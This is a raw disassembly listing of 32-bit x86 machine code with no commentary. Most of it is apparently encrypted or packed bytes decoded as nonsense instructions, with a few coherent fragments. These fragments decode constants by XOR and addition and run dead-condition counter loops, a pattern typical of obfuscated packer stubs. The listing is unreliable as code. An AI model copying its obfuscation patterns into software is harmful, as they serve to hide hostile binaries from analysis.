  41788b:	nop
  41788c:	xchg   ah,dh
  41788e:	je     0x417811
  417890:	xor    edi,0xb2a2d960
  417896:	aaa    
  417897:	clc    
  417898:	lods   al,BYTE PTR ds:[esi]
  417899:	data16 int 0x69
  41789c:	add    eax,edi
  41789e:	(bad)  
  41789f:	aam    0x5a
  4178a1:	clc    
  4178a2:	jl     0x4178ed
  4178a4:	es jo  0x4178da
  4178a7:	in     al,dx
  4178a8:	mov    bl,0x90
  4178aa:	inc    edi
  4178ab:	lods   al,BYTE PTR ds:[esi]
  4178ac:	dec    eax
  4178ad:	or     eax,0xe05c96ec
  4178b2:	add    BYTE PTR [eax+0x3b],bh
  4178b5:	cmp    eax,0xeb2035a4
  4178ba:	pop    es
  4178bb:	and    al,0x73
  4178bd:	fdiv   DWORD PTR [edi+ecx*1-0x6aa7f152]
  4178c4:	or     DWORD PTR [edx+0x7b6e51e5],eax
  4178ca:	jne    0x417892
  4178cc:	mov    bh,0xd1
  4178ce:	adc    dh,BYTE PTR [esi]
  4178d0:	cmp    eax,DWORD PTR [ebx]
  4178d2:	dec    eax
  4178d3:	cmp    al,0xe9
  4178d5:	and    eax,DWORD PTR [edx]
  4178d7:	add    BYTE PTR [eax],al
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	lods   eax,DWORD PTR ds:[esi]
  4178e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178e7:	jmp    0x7f747daa
  4178ec:	js     0x4178f3
  4178ee:	jle    0x417968
  4178f0:	js     0x4178b7
  4178f2:	jmp    0xb5ff:0x75c80e81
  4178f9:	popf   
  4178fa:	in     al,0xa7
  4178fc:	sbb    DWORD PTR [eax-0x5d484a1d],eax
  417902:	je     0x41791c
  417904:	pop    ebx
  417905:	mov    esp,0x116b4ad
  41790a:	out    dx,al
  41790b:	out    0x92,al
  41790d:	fstp   st(0)
  41790f:	stos   DWORD PTR es:[edi],eax
  417910:	out    dx,al
  417911:	cld    
  417912:	(bad)  
  417913:	and    eax,eax
  417915:	pop    edi
  417916:	cmp    ah,ah
  417918:	call   0xc597:0x99bd9c93
  41791f:	adc    edx,0xf7c65511
  417925:	fdiv   QWORD PTR [ecx+0x735b1fd3]
  41792b:	pop    eax
  41792c:	dec    edx
  41792d:	into   
  41792e:	adc    al,0xed
  417930:	mov    ah,0xc7
  417932:	adc    BYTE PTR [esi-0x6d],dh
  417935:	and    dh,BYTE PTR [edi]
  417937:	pusha  
  417938:	out    dx,al
  417939:	mov    edi,ebp
  41793b:	mov    dh,0xc
  41793d:	popf   
  41793e:	pusha  
  41793f:	shl    BYTE PTR [edi+0x34d3c22],cl
  417945:	jge    0x41796e
  417947:	xchg   ecx,eax
  417948:	push   esp
  417949:	jno    0x4179aa
  41794b:	lock push edi
  41794d:	push   edi
  41794e:	lods   al,BYTE PTR ds:[esi]
  41794f:	dec    edx
  417950:	cdq    
  417951:	xchg   BYTE PTR [eax+0x39ad4f09],dl
  417957:	add    BYTE PTR [edi],ch
  417959:	nop
  41795a:	dec    ecx
  41795b:	(bad)  
  41795e:	pop    edx
  41795f:	cmp    ch,BYTE PTR [ebx+eax*4+0x6df32ccb]
  417966:	inc    ebp
  417967:	cwde   
  417968:	ficomp DWORD PTR [eax+0x33]
  41796b:	pop    ecx
  41796c:	dec    edx
  41796d:	xor    ebp,DWORD PTR [eax]
  41796f:	in     eax,0xe3
  417971:	(bad)  
  417972:	xchg   esp,eax
  417973:	rcr    BYTE PTR [ecx-0x40],1
  417976:	jns    0x41795f
  417978:	in     eax,dx
  417979:	jae    0x417973
  41797b:	inc    ebx
  41797c:	add    BYTE PTR [edi+ecx*2-0x1c4575ca],bh
  417983:	sub    ecx,DWORD PTR [ebp+0x442348fc]
  417989:	pop    edx
  41798a:	mov    cl,0x0
  41798c:	push   0xcfb521ba
  417991:	mov    cr7,esp
  417994:	repnz sub DWORD PTR [ecx],0xffffffed
  417998:	push   cs
  417999:	fld    QWORD PTR [esi-0x3b]
  41799c:	dec    esi
  41799d:	dec    edx
  41799e:	sti    
  41799f:	jl     0x417994
  4179a1:	lods   eax,DWORD PTR ds:[esi]
  4179a2:	mov    edx,0xef5e16b1
  4179a7:	mov    ebp,0x6a2259b2
  4179ac:	(bad)  
  4179ad:	jecxz  0x4179b9
  4179af:	push   esp
  4179b0:	adc    eax,0x5987fe42
  4179b5:	outs   dx,DWORD PTR ds:[esi]
  4179b6:	push   ebp
  4179b7:	lods   eax,DWORD PTR ds:[esi]
  4179b8:	jbe    0x41797e
  4179ba:	add    eax,esi
  4179bc:	xchg   edi,eax
  4179bd:	sub    al,0xb2
  4179bf:	and    DWORD PTR [ebx+ecx*8+0x5ee44417],ebp
  4179c6:	mov    esp,0xc4f61023
  4179cb:	pop    esp
  4179cc:	sub    eax,0x4646e92d
  4179d1:	out    0x8f,eax
  4179d3:	mov    ebx,esi
  4179d5:	fidiv  DWORD PTR [eax+0x17fc742c]
  4179db:	sub    al,0xac
  4179dd:	mov    ch,0x14
  4179df:	mov    cl,0xdb
  4179e1:	mov    ah,0xbc
  4179e3:	shl    esi,1
  4179e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179e6:	fnsave [ebp-0x7c]
  4179e9:	sbb    BYTE PTR [edi-0x59],ch
  4179ec:	push   ebx
  4179ed:	leave  
  4179ee:	mov    eax,ds:0xeca2fc72
  4179f3:	int    0xd2
  4179f5:	(bad)  
  4179f7:	ins    DWORD PTR es:[edi],dx
  4179f8:	mov    ds:0xeca3754,al
  4179fd:	mov    eax,0x913d16cf
  417a02:	xchg   esi,eax
  417a03:	lea    esp,[ebp+0x3703814]
  417a09:	xlat   BYTE PTR ds:[ebx]
  417a0a:	mov    bh,0xfb
  417a0c:	das    
  417a0d:	push   ds
  417a0e:	fld    DWORD PTR [ebp+0x53928c18]
  417a14:	gs xchg ecx,eax
  417a16:	jne    0x417a4a
  417a18:	and    edx,DWORD PTR [ebp+0x141465e0]
  417a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a1f:	mov    esp,0x574ae681
  417a24:	jge    0x417a58
  417a26:	stc    
  417a27:	mov    dh,0x91
  417a29:	or     ah,BYTE PTR [esi]
  417a2b:	jg     0x417a3c
  417a2d:	aas    
  417a2e:	xchg   edi,eax
  417a2f:	aam    0xf0
  417a31:	inc    edi
  417a32:	ret    
  417a33:	mov    bh,0xcb
  417a35:	aas    
  417a36:	push   esi
  417a37:	xor    DWORD PTR [ecx-0x1b070872],ebx
  417a3d:	pop    es
  417a3e:	retf   0x4063
  417a41:	push   ebx
  417a42:	dec    ecx
  417a43:	adc    ecx,DWORD PTR [ebx-0x5f9d7565]
  417a49:	add    al,0xcd
  417a4b:	mov    al,0x70
  417a4d:	outs   dx,BYTE PTR ds:[esi]
  417a4e:	mov    ecx,0xa86b9bb
  417a53:	call   0x3d71:0x60b521d
  417a5a:	add    edx,DWORD PTR [esi-0x342a5d2]
  417a60:	cs ins DWORD PTR es:[edi],dx
  417a62:	xor    eax,0x1e02ca1a
  417a67:	jl     0x417a16
  417a69:	and    BYTE PTR [edi],dl
  417a6b:	daa    
  417a6c:	dec    edx
  417a6d:	xor    ch,BYTE PTR [esi-0x343bae8d]
  417a73:	das    
  417a74:	in     al,dx
  417a75:	xchg   edi,eax
  417a76:	out    dx,eax
  417a77:	imul   ebx,DWORD PTR [edx-0x2e],0x49
  417a7b:	ins    BYTE PTR es:[edi],dx
  417a7c:	aam    0x8f
  417a7e:	je     0x417a21
  417a80:	mov    ds:0x51a013c2,al
  417a85:	rcr    BYTE PTR [edx],0xc7
  417a88:	not    BYTE PTR [eax+0x406d9e96]
  417a8e:	stc    
  417a8f:	bound  ecx,QWORD PTR [ebp-0x15]
  417a92:	fwait
  417a93:	sub    eax,0x25387365
  417a98:	dec    eax
  417a99:	jo     0x417ab6
  417a9b:	pushf  
  417a9c:	adc    BYTE PTR [ecx+0x6c775328],0x4d
  417aa3:	fimul  WORD PTR ds:0xe38f3427
  417aa9:	mov    ah,0x99
  417aab:	xchg   ebp,eax
  417aac:	inc    eax
  417aad:	pushf  
  417aae:	bound  ebp,QWORD PTR ds:0x9fa0b45c
  417ab4:	std    
  417ab5:	xchg   BYTE PTR gs:[ecx-0x44e54d8b],dl
  417abc:	clc    
  417abd:	mov    ah,ah
  417abf:	mov    ch,0xeb
  417ac1:	out    0x67,al
  417ac3:	or     BYTE PTR [ecx-0x38],al
  417ac6:	mov    cl,0xba
  417ac8:	popa   
  417ac9:	pop    es
  417aca:	add    dh,BYTE PTR [esp+ecx*2]
  417acd:	iret   
  417ace:	and    ch,BYTE PTR [esp+eiz*4]
  417ad1:	shl    DWORD PTR [ecx],1
  417ad3:	cmc    
  417ad4:	cli    
  417ad5:	int    0x4
  417ad7:	xchg   DWORD PTR [ebx+ebx*1],ebp
  417ada:	sahf   
  417adb:	call   0xcc170d60
  417ae0:	xor    ch,bh
  417ae2:	icebp  
  417ae3:	and    DWORD PTR [esi],esi
  417ae5:	stc    
  417ae6:	adc    BYTE PTR [edi+0x2b9afefa],dh
  417aec:	(bad)  
  417aed:	(bad)  
  417aee:	fisubr DWORD PTR [ebp+0x247a0b5f]
  417af4:	scas   eax,DWORD PTR es:[edi]
  417af5:	lea    edx,[edx]
  417af7:	and    eax,0x1f21083
  417afc:	mov    edx,0x7510850
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0x82773e6c
  417b49:	out    0x11,eax
  417b4b:	xor    DWORD PTR [edi+0x78],edi
  417b4e:	add    eax,0xf178787e
  417b53:	nop
  417b54:	addr16 aad 0xfe
  417b57:	mov    cl,0x34
  417b59:	shl    BYTE PTR [ecx-0x230b55c3],0x3e
  417b60:	dec    eax
  417b61:	sbb    cl,BYTE PTR [edx]
  417b63:	(bad)  
  417b64:	push   esp
  417b65:	mov    eax,ds:0xbb7fa63b
  417b6a:	(bad)  
  417b6b:	jp     0x417b4a
  417b6d:	jg     0x417b64
  417b6f:	fld    DWORD PTR [edi-0x9b94478]
  417b75:	mul    DWORD PTR [edx-0x1f55083f]
  417b7b:	sbb    cl,BYTE PTR [edi]
  417b7d:	(bad)  
  417b7e:	(bad)  
  417b7f:	call   0x592abe43
  417b84:	mov    ?,WORD PTR [edi]
  417b86:	mov    eax,0xe9555baf
  417b8b:	(bad)  
  417b8d:	into   
  417b8e:	xchg   edx,eax
  417b8f:	or     BYTE PTR [ebx+edx*2+0x2d],cl
  417b93:	int    0x7f
  417b95:	push   eax
  417b96:	dec    esp
  417b97:	mov    ch,0x27
  417b99:	xor    al,0xd2
  417b9b:	sbb    bh,BYTE PTR [ebp-0x5fc9ead]
  417ba1:	shl    DWORD PTR [ecx+0x13],cl
  417ba4:	push   es
  417ba5:	mov    ch,0xe
  417ba7:	mov    ecx,0x33de1b55
  417bac:	xor    BYTE PTR [ebp+0x3e],dl
  417baf:	add    ah,BYTE PTR [ecx-0x8]
  417bb2:	mov    eax,ds:0x79efb6dc
  417bb7:	lds    edi,FWORD PTR [edi-0x2d]
  417bba:	and    DWORD PTR [ebp*2+0x683b83f9],ebp
  417bc1:	daa    
  417bc2:	je     0x417b78
  417bc4:	inc    ecx
  417bc5:	enter  0xa285,0x14
  417bc9:	mov    DWORD PTR [ecx-0xb16cf49],edx
  417bcf:	stos   DWORD PTR es:[edi],eax
  417bd0:	lods   al,BYTE PTR ds:[esi]
  417bd1:	xchg   BYTE PTR [eax],dl
  417bd3:	sahf   
  417bd4:	jge    0x417c48
  417bd6:	inc    ebx
  417bd7:	pop    esi
  417bd8:	push   esp
  417bd9:	or     al,al
  417bdb:	mov    eax,ds:0xe4cdaa50
  417be0:	dec    ebx
  417be1:	mov    eax,0x493224f1
  417be6:	movhps xmm4,QWORD PTR [eax]
  417be9:	sub    al,BYTE PTR [ecx+0x71]
  417bec:	cmc    
  417bed:	inc    edi
  417bee:	mov    eax,0xa26bf13d
  417bf3:	inc    edx
  417bf4:	and    eax,0xf37b6
  417bf9:	xor    eax,0x10beda99
  417bfe:	leave  
  417bff:	iret   
  417c00:	ins    DWORD PTR es:[edi],dx
  417c01:	mov    eax,ds:0x743cb8b7
  417c06:	mov    ds:0xf345d8c9,eax
  417c0b:	add    bl,bh
  417c0d:	xchg   edx,eax
  417c0e:	push   ss
  417c0f:	mov    gs,WORD PTR [esi-0x29]
  417c12:	leave  
  417c13:	ret    0xa1
  417c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c17:	jno    0x417c47
  417c19:	or     DWORD PTR [edi+0x564db9bd],edi
  417c1f:	mov    ebx,0x74be33dc
  417c24:	dec    eax
  417c25:	jg     0x417bab
  417c27:	push   0xffffffdc
  417c29:	std    
  417c2a:	pop    edx
  417c2b:	add    DWORD PTR [esp+eax*2+0x6b],eax
  417c2f:	icebp  
  417c30:	jle    0x417ca5
  417c32:	outs   dx,BYTE PTR ds:[esi]
  417c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c34:	sbb    eax,0xa53ad027
  417c39:	rcl    DWORD PTR [edi+0x411549c8],0xe9
  417c40:	cmp    al,0xf5
  417c42:	jno    0x417c29
  417c44:	add    eax,0x311960f7
  417c49:	sub    DWORD PTR [ebp-0x4e],ebx
  417c4c:	js     0x417bec
  417c4e:	inc    ebp
  417c4f:	cs xchg esi,eax
  417c51:	icebp  
  417c52:	shl    cl,cl
  417c54:	adc    DWORD PTR [esi+0x6f],esi
  417c57:	sbb    al,0xf
  417c59:	and    DWORD PTR [esi+0x1d30bc6c],ecx
  417c5f:	loope  0x417cbf
  417c61:	add    dh,dl
  417c63:	pop    eax
  417c64:	jecxz  0x417ca7
  417c66:	loop   0x417c2f
  417c68:	sbb    DWORD PTR [eax],0xd0718b76
  417c6e:	xlat   BYTE PTR ds:[ebx]
  417c6f:	jns    0x417cda
  417c71:	sub    eax,0x76b149d0
  417c76:	into   
  417c77:	mov    al,0x89
  417c79:	(bad)  
  417c7a:	or     eax,0x8c90a8f1
  417c7f:	mov    WORD PTR [esi-0x7eed725e],ss
  417c85:	repz and ebp,ebx
  417c88:	mov    ebp,0x5295110c
  417c8d:	mov    edx,0x5b332c8a
  417c93:	or     al,0xb7
  417c95:	shr    BYTE PTR [edx-0x2d0fd6b1],1
  417c9b:	and    al,0x56
  417c9d:	out    dx,al
  417c9e:	jg     0x417c4c
  417ca0:	or     BYTE PTR [ebx],ah
  417ca2:	cli    
  417ca3:	inc    ebp
  417ca4:	mov    eax,0xa57a02ca
  417ca9:	mov    ?,WORD PTR [ebp+0x9fa5231]
  417caf:	pushf  
  417cb0:	cmp    al,0x5e
  417cb2:	call   0x3d78:0x3872515e
  417cb9:	call   0x5e2b:0xf46ca884
  417cc0:	cdq    
  417cc1:	pop    DWORD PTR [eax]
  417cc3:	in     al,0x83
  417cc5:	inc    cl
  417cc7:	stos   DWORD PTR es:[edi],eax
  417cc8:	rol    BYTE PTR [ebx-0x77aad334],1
  417cce:	stc    
  417ccf:	mov    dh,0x8b
  417cd1:	sbb    bh,BYTE PTR [esp+eax*1+0x7e]
  417cd5:	loopne 0x417cce
  417cd7:	pop    edx
  417cd8:	jne    0x417c89
  417cda:	mov    bl,0xe
  417cdc:	imul   ebp,DWORD PTR [edx],0xffffff98
  417cdf:	dec    esp
  417ce0:	cmp    DWORD PTR [ebp+0x5f],ecx
  417ce3:	xor    BYTE PTR [edi+0x2c],bl
  417ce6:	jecxz  0x417cbd
  417ce8:	cmc    
  417ce9:	shr    BYTE PTR [eax+edx*4-0x37],1
  417ced:	mov    bl,0x5
  417cef:	call   0x7bac:0xdbc49917
  417cf6:	shl    BYTE PTR [esi+edi*1],1
  417cf9:	jp     0x417c85
  417cfb:	imul   eax
  417cfd:	inc    esp
  417cfe:	xor    bl,BYTE PTR [ebx+0x46]
  417d01:	dec    ebx
  417d02:	pop    esp
  417d03:	scas   al,BYTE PTR es:[edi]
  417d04:	loopne 0x417cd9
  417d06:	repnz mov ebp,0xe5d0d6a7
  417d0c:	(bad)  
  417d0d:	ret    
  417d0e:	sar    ecx,cl
  417d10:	mov    dh,0x92
  417d12:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d14:	push   0x39c67ff0
  417d19:	pop    esp
  417d1a:	mov    bh,0x17
  417d1c:	imul   esp,DWORD PTR [edi-0x28],0x78
  417d20:	aaa    
  417d21:	mov    ebp,0x5fc27072
  417d26:	pop    eax
  417d27:	es mov dl,0x51
  417d2a:	sub    eax,0xa61640c1
  417d2f:	repz inc ebx
  417d31:	add    esi,esi
  417d33:	push   0xffffff96
  417d35:	(bad)  
  417d36:	cwde   
  417d37:	iret   
  417d38:	retf   
  417d39:	in     eax,dx
  417d3a:	sub    edx,esi
  417d3c:	out    0x6d,eax
  417d3e:	xchg   esp,eax
  417d3f:	xor    dh,bl
  417d41:	mov    al,ds:0x55b92e30
  417d46:	loopne 0x417d42
  417d48:	ins    DWORD PTR es:[edi],dx
  417d49:	sub    ebx,DWORD PTR es:[eax]
  417d4c:	sub    ebx,0x6b97ffe4
  417d52:	xchg   ebp,eax
  417d53:	sti    
  417d54:	adc    al,0xb9
  417d56:	fsub   DWORD PTR [edi+0x76]
  417d59:	cli    
  417d5a:	mov    esi,DWORD PTR [edi+0x8503592]
  417d60:	push   ecx
  417d61:	pop    es
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a821,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a821
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a821,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a821,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a821,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a825
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a79d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a85d,0x42a851
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a855,0x42a8a9
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a795,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a855,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a82d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a779,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a811,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a811
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a811,esi
  417e51:	cmp    DWORD PTR ds:0x42a811,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a811,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	(bad)  
  417e8d:	jl     0x417ed9
  417e8f:	dec    BYTE PTR ds:0x787f371e
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	xchg   esi,eax
  417e9a:	icebp  
  417e9b:	mov    DWORD PTR [esi],edx
  417e9d:	call   0xaee:0x39e2a0a4
  417ea4:	popf   
  417ea5:	popf   
  417ea6:	(bad)  [esi-0x49]
  417ea9:	sbb    bl,BYTE PTR [ebp-0x7cb0e750]
  417eaf:	cmp    BYTE PTR [ecx-0x7],ch
  417eb2:	xor    al,ch
  417eb4:	fwait
  417eb5:	ins    BYTE PTR es:[edi],dx
  417eb6:	inc    eax
  417eb7:	mov    al,ds:0xe902fd9a
  417ebc:	jne    0x417f35
  417ebe:	inc    edi
  417ebf:	call   0x3727:0xc4a24679
  417ec6:	jmp    0x8144a244
  417ecb:	cmp    eax,0x221f12e
  417ed0:	ins    DWORD PTR es:[edi],dx
  417ed1:	sahf   
  417ed2:	sub    BYTE PTR [esi+0x344a3916],cl
  417ed8:	push   esp
  417ed9:	mov    ds:0x6d3d7721,eax
  417ede:	clc    
  417edf:	dec    esi
  417ee0:	xchg   esi,eax
  417ee1:	xor    ecx,DWORD PTR [edx+eiz*1-0x269bc910]
  417ee8:	sbb    esi,DWORD PTR ds:0x654a4832
  417eee:	cdq    
  417eef:	shr    DWORD PTR [edx+eiz*8],cl
  417ef2:	sbb    BYTE PTR [ebp+0x52],ch
  417ef5:	mov    ds:0x7c0eed3a,eax
  417efa:	cmc    
  417efb:	xchg   BYTE PTR [ecx],bl
  417efd:	scas   al,BYTE PTR es:[edi]
  417efe:	call   0xe727:0xbdfbff82
  417f05:	out    0xac,eax
  417f07:	push   esi
  417f08:	nop
  417f09:	stc    
  417f0a:	jg     0x417eee
  417f0c:	dec    edx
  417f0d:	pop    ebp
  417f0e:	push   ebx
  417f0f:	xor    al,dl
  417f11:	push   es
  417f12:	jmp    0x417ed4
  417f14:	sub    BYTE PTR [eax-0x39],dh
  417f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f18:	xchg   esp,eax
  417f19:	dec    BYTE PTR [ebp+0x4c103a46]
  417f1f:	cmp    DWORD PTR [ebp+0x3c],edx
  417f22:	xchg   BYTE PTR [eax-0x3d],ah
  417f25:	loop   0x417eef
  417f27:	push   0xffffffa6
  417f29:	ins    BYTE PTR es:[edi],dx
  417f2a:	jnp    0x417fa6
  417f2c:	and    ch,BYTE PTR [edx]
  417f2e:	sbb    eax,0x644302b7
  417f33:	inc    edi
  417f34:	retf   
  417f35:	jmp    0x417ee3
  417f37:	jno    0x417ef6
  417f39:	xor    esp,esp
  417f3b:	mov    ecx,DWORD PTR [edx-0x6f]
  417f3e:	mov    ds:0xa363458e,al
  417f43:	jle    0x417f6b
  417f45:	inc    esp
  417f46:	xchg   esp,eax
  417f47:	cwde   
  417f48:	pop    ecx
  417f49:	push   cs
  417f4a:	retf   0x7abd
  417f4d:	mov    ah,0x1b
  417f4f:	lea    ecx,[ebp+0x5e]
  417f52:	lods   eax,DWORD PTR ds:[esi]
  417f53:	pop    ebp
  417f54:	repnz scas al,BYTE PTR es:[edi]
  417f56:	fild   QWORD PTR [eax]
  417f58:	mov    dl,0x8
  417f5a:	pop    es
  417f5b:	and    al,0xc7
  417f5d:	addr16 sub al,0x6f
  417f60:	cld    
  417f61:	jo     0x417f74
  417f63:	sub    BYTE PTR [ebx],dl
  417f65:	push   ss
  417f66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f67:	fbld   TBYTE PTR [edx+0x102462c9]
  417f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f6e:	push   esi
  417f6f:	push   esp
  417f70:	aad    0xdf
  417f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f73:	clc    
  417f74:	in     eax,0x55
  417f76:	pop    ebx
  417f77:	(bad)  
  417f78:	jbe    0x417fd9
  417f7a:	dec    esi
  417f7b:	shr    BYTE PTR [esi+eiz*8-0x1df297e9],0xbc
  417f83:	sub    al,0x5a
  417f85:	push   0xe4281dc2
  417f8a:	pop    ebx
  417f8b:	xor    al,0x66
  417f8d:	cmp    DWORD PTR [edi+edx*8-0x1e29a7c0],ebx
  417f94:	imul   ebx,DWORD PTR [edx+0x7e],0xfeb07920
  417f9b:	pop    ds
  417f9c:	pop    ds
  417f9d:	fwait
  417f9e:	sbb    esp,DWORD PTR [edx+0x61e78d89]
  417fa4:	aaa    
  417fa5:	add    ecx,eax
  417fa7:	mov    cl,0x1e
  417fa9:	cmp    DWORD PTR [edx+0x5e],ebx
  417fac:	ror    BYTE PTR ds:0xf82fd15f,cl
  417fb2:	ret    0xacdb
  417fb5:	pop    eax
  417fb6:	ins    BYTE PTR es:[edi],dx
  417fb7:	xchg   ecx,eax
  417fb8:	and    al,0xab
  417fba:	sbb    edi,DWORD PTR [ebp+edi*1+0x50]
  417fbe:	arpl   WORD PTR [edi],dx
  417fc0:	(bad)  
  417fc2:	retf   0x41ae
  417fc5:	mov    ch,0x7
  417fc7:	adc    edx,ebp
  417fc9:	cmp    eax,0xab03d8dd
  417fce:	and    al,0xc2
  417fd0:	out    0xa2,al
  417fd2:	pop    ebp
  417fd3:	ja     0x417f64
  417fd5:	fidivr DWORD PTR ds:0xd71784c4
  417fdb:	pop    ebx
  417fdc:	(bad)  
  417fdd:	fnstsw ax
  417fdf:	lods   al,BYTE PTR ds:[esi]
  417fe0:	out    dx,al
  417fe1:	call   0xe8d9:0x7ab93fb1
  417fe8:	in     eax,dx
  417fe9:	aaa    
  417fea:	fsubrp st(3),st
  417fec:	mov    esi,0xc9211c52
  417ff1:	mov    WORD PTR [eax+0x72],?
  417ff4:	(bad)  
  417ff5:	adc    BYTE PTR [ebp-0x66363a02],ch
  417ffb:	sahf   
  417ffc:	mov    DWORD PTR [edi],esi
  417ffe:	xchg   ebp,eax
  417fff:	sbb    eax,0xc777433e
  418004:	imul   BYTE PTR [eax+ebx*4]
  418007:	mov    ch,0x51
  418009:	out    0x2e,al
  41800b:	iret   
  41800c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41800d:	clc    
  41800e:	fdiv   DWORD PTR [esi-0x11]
  418011:	add    al,0x3b
  418013:	fwait
  418014:	or     cl,BYTE PTR [esi-0x6cf2f48]
  41801a:	mov    bl,0x2e
  41801c:	xor    eax,0xf3468cb7
  418021:	pop    ss
  418022:	les    eax,FWORD PTR [ecx+0x5166ff3]
  418028:	sbb    DWORD PTR [edi],ecx
  41802a:	dec    ecx
  41802b:	pop    ecx
  41802c:	ficomp WORD PTR [edi+ebp*4]
  41802f:	int    0xeb
  418031:	add    cl,BYTE PTR [edi-0x2f90d12c]
  418037:	jecxz  0x417fc3
  418039:	sub    eax,0x27373c94
  41803e:	dec    bl
  418040:	scas   al,BYTE PTR es:[edi]
  418041:	jle    0x4180ba
  418043:	nop
  418044:	jns    0x41803a
  418046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418047:	or     BYTE PTR [esi],ah
  418049:	xor    cl,BYTE PTR ds:0xb2aa73d8
  41804f:	pop    eax
  418050:	int3   
  418051:	jmp    0x1bd4a23a
  418056:	fnsave [ebp-0x733dc758]
  41805c:	fld    DWORD PTR ds:0xdb1faae8
  418062:	cmp    ecx,DWORD PTR [ecx-0x6f]
  418065:	js     0x41804f
  418067:	add    BYTE PTR [ecx-0xa],dh
  41806a:	es push ecx
  41806c:	aam    0xcb
  41806e:	jl     0x418098
  418070:	xor    al,0xa4
  418072:	jns    0x417ff9
  418074:	jno    0x418091
  418076:	int3   
  418077:	xor    al,bh
  418079:	fdivr  QWORD PTR [esi+0x7f]
  41807c:	jle    0x418032
  41807e:	test   eax,0xbea50993
  418083:	cmp    dl,BYTE PTR [esp+ecx*1+0x119bb032]
  41808a:	pop    es
  41808b:	add    edx,DWORD PTR ds:0x861ac73f
  418091:	or     al,0x35
  418093:	mov    al,ds:0x1c5ca239
  418098:	in     al,0xfa
  41809a:	or     BYTE PTR [edx+ebp*4+0x23],0x15
  41809f:	inc    esi
  4180a0:	xor    ch,bl
  4180a2:	lds    ebx,FWORD PTR ss:[eax-0x34a908da]
  4180a9:	mov    ebx,0x3a75e3a3
  4180ae:	mov    ch,0xc
  4180b0:	mov    ds:0xe07dd7b3,eax
  4180b5:	clc    
  4180b6:	mov    ds:0x85ce16d1,eax
  4180bb:	(bad)  ds:0x8625a77b
  4180c1:	adc    al,0x50
  4180c3:	xchg   BYTE PTR [edi-0x2e325685],cl
  4180c9:	(bad)  
  4180ca:	jns    0x41810f
  4180cc:	out    0xd3,al
  4180ce:	cmc    
  4180cf:	adc    BYTE PTR [eax+ebx*8-0x2a],0x2d
  4180d4:	jl     0x418133
  4180d6:	enter  0xcfc4,0xf7
